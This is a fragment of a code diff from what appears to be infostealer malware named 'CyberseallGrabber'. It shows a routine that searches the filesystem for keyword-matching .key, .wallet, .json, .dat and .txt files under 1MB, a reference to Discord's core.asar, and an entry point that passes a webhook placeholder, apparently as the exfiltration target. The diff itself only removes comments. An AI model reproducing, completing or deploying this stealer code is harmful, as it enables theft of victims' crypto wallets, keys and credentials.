                             if any(keyword in f.lower() for keyword in self.keywords) and f.lower().endswith(('.txt','.key','.wallet','.json','.dat')):
                                 fp = os.path.join(root, f)
                                 try:
-                                    if os.path.getsize(fp) < 1024*1024:  # 1MB limit
+                                    if os.path.getsize(fp) < 1024*1024:
                                         found_files.append(fp)
                                 except:
                                     pass
@@ -2507,4 +3455,3 @@ module.exports = require('./core.asar');
 if __name__ == "__main__":
     CyberseallGrabber("WEBHOOK_PLACEHOLDER") 
 
-# update
